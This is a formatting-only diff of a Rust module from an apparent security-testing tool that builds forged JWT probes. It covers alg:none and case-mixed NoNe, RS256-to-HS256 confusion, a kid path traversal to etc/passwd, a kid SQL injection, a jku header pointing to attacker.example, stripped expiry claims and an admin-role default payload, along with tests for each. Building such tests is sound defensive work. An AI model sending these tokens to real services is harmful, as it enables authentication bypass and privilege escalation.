@@ -36,8 +36,8 @@
 //! - <https://www.rfc-editor.org/rfc/rfc8725> (JWT BCP, security)
 //! - <https://blog.pentesteracademy.com/hacking-jwt-tokens-cve-2015-9235-the-none-algorithm-d8edaa46c4dd>
 
-use base64::engine::general_purpose::URL_SAFE_NO_PAD;
 use base64::Engine;
+use base64::engine::general_purpose::URL_SAFE_NO_PAD;
 use wafrift_types::canary::Canary;
 use wafrift_types::probe::{SmuggleArtifact, SmuggleProbe};
 
@@ -103,9 +103,7 @@ impl JwtSmuggleTechnique {
             Self::KidSqlInjection => "jwt.kid-sql-injection",
             Self::JkuAttackerUrl => "jwt.jku-attacker-url",
             Self::EmptySignature => "jwt.empty-signature",
-            Self::NoneAlgWithGarbageSignature => {
-                "jwt.none-alg-with-garbage-signature"
-            }
+            Self::NoneAlgWithGarbageSignature => "jwt.none-alg-with-garbage-signature",
             Self::ExpiryClaimRemoved => "jwt.expiry-claim-removed",
             Self::PayloadDuplicateKey => "jwt.payload-duplicate-key",
         }
@@ -118,30 +116,20 @@ impl JwtSmuggleTechnique {
             Self::AlgNone => {
                 "`alg:none` acceptance — historic CVE class, still ships in lazy validators"
             }
-            Self::AlgNoneCaseMix => {
-                "Case-mixed `alg:NoNe` — ascii-fold downgrade differential"
-            }
+            Self::AlgNoneCaseMix => "Case-mixed `alg:NoNe` — ascii-fold downgrade differential",
             Self::AlgConfusionRs256ToHs256 => {
                 "RS256→HS256 algorithm confusion — RSA public key used as HMAC secret"
             }
             Self::KidPathTraversal => {
                 "Path traversal in `kid` header — file-load key resolution exploit"
             }
-            Self::KidSqlInjection => {
-                "SQL injection in `kid` header — DB key-lookup exploit"
-            }
-            Self::JkuAttackerUrl => {
-                "Attacker-controlled `jku` URL — JWKS fetch differential"
-            }
-            Self::EmptySignature => {
-                "Empty signature segment — no-sig-required validator bypass"
-            }
+            Self::KidSqlInjection => "SQL injection in `kid` header — DB key-lookup exploit",
+            Self::JkuAttackerUrl => "Attacker-controlled `jku` URL — JWKS fetch differential",
+            Self::EmptySignature => "Empty signature segment — no-sig-required validator bypass",
             Self::NoneAlgWithGarbageSignature => {
                 "Garbage signature with `alg:none` — validator paradox bypass"
             }
-            Self::ExpiryClaimRemoved => {
-                "Stripped `exp` claim — permanent-token bypass"
-            }
+            Self::ExpiryClaimRemoved => "Stripped `exp` claim — permanent-token bypass",
             Self::PayloadDuplicateKey => {
                 "Duplicate-key in JWT payload — RFC 8259 resolution differential"
             }
@@ -169,8 +157,7 @@ fn b64url(bytes: &[u8]) -> String {
 /// operator doesn't supply a base token. The shapes match standard
 /// RS256 / HS256 JWT layout so validators see a structurally
 /// realistic token.
-const DEFAULT_PAYLOAD_JSON: &str =
-    r#"{"sub":"admin","role":"admin","exp":9999999999}"#;
+const DEFAULT_PAYLOAD_JSON: &str = r#"{"sub":"admin","role":"admin","exp":9999999999}"#;
 const PLACEHOLDER_SIG: &str = "wafrift-sig-placeholder";
 
 impl JwtSmuggleProbe {
@@ -183,8 +170,7 @@ impl JwtSmuggleProbe {
         // Try to use the operator's --credential as a base JWT —
         // if it's not a 3-segment JWT, build a synthetic one with
         // the credential spliced into the `sub` claim.
-        let (base_header, base_payload, base_sig) =
-            split_or_synthesize_jwt(credential_value);
+        let (base_header, base_payload, base_sig) = split_or_synthesize_jwt(credential_value);
 
         let token = match technique {
             JwtSmuggleTechnique::AlgNone => {
@@ -214,8 +200,7 @@ impl JwtSmuggleProbe {
                 )
             }
             JwtSmuggleTechnique::KidSqlInjection => {
-                let header =
-                    r#"{"alg":"HS256","kid":"x' UNION SELECT 'AAAA'--","typ":"JWT"}"#;
+                let header = r#"{"alg":"HS256","kid":"x' UNION SELECT 'AAAA'--","typ":"JWT"}"#;
                 format!(
                     "{}.{}.{}",
                     b64url(header.as_bytes()),
@@ -224,7 +209,8 @@ impl JwtSmuggleProbe {
                 )
             }
             JwtSmuggleTechnique::JkuAttackerUrl => {
-                let header = r#"{"alg":"RS256","jku":"https://attacker.example/keys.json","typ":"JWT"}"#;
+                let header =
+                    r#"{"alg":"RS256","jku":"https://attacker.example/keys.json","typ":"JWT"}"#;
                 format!(
                     "{}.{}.{}",
                     b64url(header.as_bytes()),
@@ -295,7 +281,11 @@ fn split_or_synthesize_jwt(credential: &str) -> (String, String, String) {
             b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'='
         }))
     {
-        (parts[0].to_string(), parts[1].to_string(), parts[2].to_string())
+        (
+            parts[0].to_string(),
+            parts[1].to_string(),
+            parts[2].to_string(),
+        )
     } else {
         // Synthesize. Pin the sub claim to the operator credential
         // so the probe carries identity context.
@@ -416,10 +406,7 @@ mod tests {
     #[test]
     #[allow(non_snake_case)] // `NoNe` mirrors the asserted mixed-case alg literal — the case-mix bypass marker.
     fn alg_none_case_mix_header_decodes_to_NoNe() {
-        let p = JwtSmuggleProbe::new(
-            JwtSmuggleTechnique::AlgNoneCaseMix,
-            "wafrift-test",
-        );
+        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::AlgNoneCaseMix, "wafrift-test");
         let header_b64 = p.token.split('.').next().unwrap();
         let header = String::from_utf8(URL_SAFE_NO_PAD.decode(header_b64).unwrap()).unwrap();
         assert!(header.contains("NoNe"), "header: {header}");
@@ -437,49 +424,34 @@ mod tests {
 
     #[test]
     fn kid_path_traversal_variant_contains_etc_passwd() {
-        let p = JwtSmuggleProbe::new(
-            JwtSmuggleTechnique::KidPathTraversal,
-            "wafrift-test",
-        );
+        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::KidPathTraversal, "wafrift-test");
         let header = decode_header(&p.token);
         assert!(header.contains("etc/passwd"), "header: {header}");
     }
 
     #[test]
     fn kid_sql_injection_variant_contains_sql_payload() {
-        let p = JwtSmuggleProbe::new(
-            JwtSmuggleTechnique::KidSqlInjection,
-            "wafrift-test",
-        );
+        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::KidSqlInjection, "wafrift-test");
         let header = decode_header(&p.token);
         assert!(header.contains("UNION SELECT"), "header: {header}");
     }
 
     #[test]
     fn jku_attacker_variant_contains_attacker_url() {
-        let p = JwtSmuggleProbe::new(
-            JwtSmuggleTechnique::JkuAttackerUrl,
-            "wafrift-test",
-        );
+        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::JkuAttackerUrl, "wafrift-test");
         let header = decode_header(&p.token);
         assert!(header.contains("attacker"), "header: {header}");
     }
 
     #[test]
     fn empty_signature_variant_ends_with_dot() {
-        let p = JwtSmuggleProbe::new(
-            JwtSmuggleTechnique::EmptySignature,
-            "wafrift-test",
-        );
+        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::EmptySignature, "wafrift-test");
         assert!(p.token.ends_with('.'), "token: {}", p.token);
     }
 
     #[test]
     fn expiry_removed_variant_payload_lacks_exp_claim() {
-        let p = JwtSmuggleProbe::new(
-            JwtSmuggleTechnique::ExpiryClaimRemoved,
-            "wafrift-test",
-        );
+        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::ExpiryClaimRemoved, "wafrift-test");
         let payload_b64 = p.token.split('.').nth(1).unwrap();
         let payload = String::from_utf8(URL_SAFE_NO_PAD.decode(payload_b64).unwrap()).unwrap();
         assert!(!payload.contains("exp"), "payload still has exp: {payload}");
@@ -487,10 +459,7 @@ mod tests {
 
     #[test]
     fn payload_duplicate_key_variant_contains_two_role_pairs() {
-        let p = JwtSmuggleProbe::new(
-            JwtSmuggleTechnique::PayloadDuplicateKey,
-            "wafrift-test",
-        );
+        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::PayloadDuplicateKey, "wafrift-test");
         let payload_b64 = p.token.split('.').nth(1).unwrap();
         let payload = String::from_utf8(URL_SAFE_NO_PAD.decode(payload_b64).unwrap()).unwrap();
         let role_count = payload.matches("\"role\":").count();
@@ -500,8 +469,7 @@ mod tests {
     #[test]
     fn canaries_are_unique_per_probe() {
         let probes = all_variants("wafrift-test");
-        let tokens: HashSet<String> =
-            probes.iter().map(|p| p.canary().token.clone()).collect();
+        let tokens: HashSet<String> = probes.iter().map(|p| p.canary().token.clone()).collect();
         assert_eq!(tokens.len(), probes.len());
     }
 
@@ -533,8 +501,7 @@ mod tests {
         );
         let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::AlgNone, &base);
         let parts: Vec<&str> = p.token.split('.').collect();
-        let payload =
-            String::from_utf8(URL_SAFE_NO_PAD.decode(parts[1]).unwrap()).unwrap();
+        let payload = String::from_utf8(URL_SAFE_NO_PAD.decode(parts[1]).unwrap()).unwrap();
         assert!(payload.contains("victim"), "payload: {payload}");
     }
 
@@ -545,9 +512,11 @@ mod tests {
             "wafrift-custom-creds",
         );
         let parts: Vec<&str> = p.token.split('.').collect();
-        let payload =
-            String::from_utf8(URL_SAFE_NO_PAD.decode(parts[1]).unwrap()).unwrap();
-        assert!(payload.contains("wafrift-custom-creds"), "payload: {payload}");
+        let payload = String::from_utf8(URL_SAFE_NO_PAD.decode(parts[1]).unwrap()).unwrap();
+        assert!(
+            payload.contains("wafrift-custom-creds"),
+            "payload: {payload}"
+        );
     }
 
     /// Test helper: decode the JWT header from a token string.
